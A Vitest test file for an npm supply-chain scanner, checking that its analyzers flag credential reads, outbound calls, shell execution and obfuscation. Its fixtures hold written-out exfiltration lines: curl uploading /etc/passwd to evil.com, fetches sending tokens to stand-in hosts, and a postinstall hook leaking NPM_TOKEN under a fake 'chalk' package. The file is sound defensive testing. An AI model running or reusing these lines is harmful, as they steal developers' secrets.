import { describe, it, expect } from 'vitest';
import { ScriptAnalyzer } from '../../../src/analyzers/install-scripts/script-analyzer.js';
import { ExfiltrationAnalyzer } from '../../../src/analyzers/exfiltration/exfiltration-analyzer.js';
import { AnalysisContext } from '../../../src/core/context.js';
import { analyzeCode } from '../../../src/analyzers/install-scripts/ast-engine.js';
import type { NpmPackageMetadata } from '../../../src/providers/npm/types.js';

describe('AST Engine & Script Analyzer', () => {
  it('detects process.env access', () => {
    const code = `
      const token = process.env.NPM_TOKEN;
      const key = process.env.API_KEY;
    `;
    const detections = analyzeCode(code, 'test.js');

    expect(detections.some((d) => d.type === 'process-env-read')).toBe(true);
    expect(detections.some((d) => d.type === 'npm-token')).toBe(true);
    expect(detections.some((d) => d.type === 'api-key')).toBe(true);
  });

  it('detects sensitive file references', () => {
    const code = `
      const fs = require('fs');
      const sshKey = fs.readFileSync('/home/user/.ssh/id_rsa');
      const npmrc = fs.readFileSync('.npmrc');
    `;
    const detections = analyzeCode(code, 'test.js');

    expect(detections.some((d) => d.type === 'sensitive-file-access')).toBe(true);
    expect(detections.some((d) => d.type === 'ssh-key-access')).toBe(true);
    expect(detections.some((d) => d.type === 'npmrc-access')).toBe(true);
  });

  it('detects outbound network calls', () => {
    const code = `
      fetch('https://evil-exfiltrator.com/steal?data=' + token);
      const req = require('http').request('http://192.168.1.100');
    `;
    const detections = analyzeCode(code, 'test.js');

    expect(detections.some((d) => d.type === 'fetch-call')).toBe(true);
    expect(detections.some((d) => d.type === 'network-module-import')).toBe(true);
    expect(detections.some((d) => d.type === 'url-literal')).toBe(true);
  });

  it('detects child process and dangerous shell executions', () => {
    const code = `
      const { exec } = require('child_process');
      exec('curl -F "file=@/etc/passwd" https://evil.com');
    `;
    const detections = analyzeCode(code, 'test.js');

    expect(detections.some((d) => d.type === 'child-process-import')).toBe(true);
    expect(detections.some((d) => d.type === 'process-execution')).toBe(true);
    expect(detections.some((d) => d.type === 'dangerous-command-string')).toBe(true);
  });

  it('detects obfuscation and dynamic execution', () => {
    const code = `
      eval('console.log("hello")');
      const fn = new Function('a', 'return a');
      const data = Buffer.from('aGVsbG8=', 'base64');
    `;
    const detections = analyzeCode(code, 'test.js');

    expect(detections.some((d) => d.type === 'eval-usage')).toBe(true);
    expect(detections.some((d) => d.type === 'function-constructor')).toBe(true);
    expect(detections.some((d) => d.type === 'encoded-data')).toBe(true);
  });

  it('runs install script analyzer successfully and flags suspicious combinations', async () => {
    const analyzer = new ScriptAnalyzer();
    const context = new AnalysisContext('chalk');

    context.npmMetadata = {
      name: 'chalk',
      'dist-tags': { latest: '5.3.0' },
      versions: {
        '5.3.0': {
          scripts: {
            // Suspicious combination: process.env read + network requests
            postinstall: 'node -e "fetch(\'https://evil.com?token=\' + process.env.NPM_TOKEN)"',
          },
        },
      },
    } as unknown as NpmPackageMetadata;

    const result = await analyzer.analyze(context);
    expect(result.analyzer).toBe('install-scripts');
    expect(result.status).toBe('completed');
    expect(result.metadata['hasInstallScripts']).toBe(true);

    const scriptResults = result.metadata['scriptResults'] as any[];
    expect(scriptResults).toHaveLength(1);
    expect(scriptResults[0].hook).toBe('postinstall');
    expect(scriptResults[0].suspiciousCombinations).toHaveLength(1); // env + fetch
  });
});

describe('ExfiltrationAnalyzer', () => {
  it('flags data exfiltration findings based on script analyzer results', async () => {
    const exfilAnalyzer = new ExfiltrationAnalyzer();
    const context = new AnalysisContext('chalk');

    // Populate script analyzer results in context
    context.npmMetadata = { name: 'chalk', 'dist-tags': { latest: '5.3.0' }, versions: {} } as any;
    context.scriptAnalysisResults = [
      {
        hook: 'preinstall',
        command: 'node hack.js',
        files: [],
        detections: [
          { detector: 'env-access', type: 'process-env-read', severity: 'medium', description: 'reads env' },
          { detector: 'network', type: 'fetch-call', severity: 'medium', description: 'makes request' },
        ],
        suspiciousCombinations: [
          { detections: ['process-env-read', 'fetch-call'], severity: 'critical', reason: 'exfiltration pattern' },
        ],
      },
    ] as any;

    const result = await exfilAnalyzer.analyze(context);

    expect(result.analyzer).toBe('exfiltration');
    expect(result.status).toBe('completed');
    expect(result.findings).toHaveLength(1);
    expect(result.findings[0]?.ruleId).toBe('exfiltration/data-theft-pattern');
    expect(result.findings[0]?.severity).toBe('critical');
  });
});
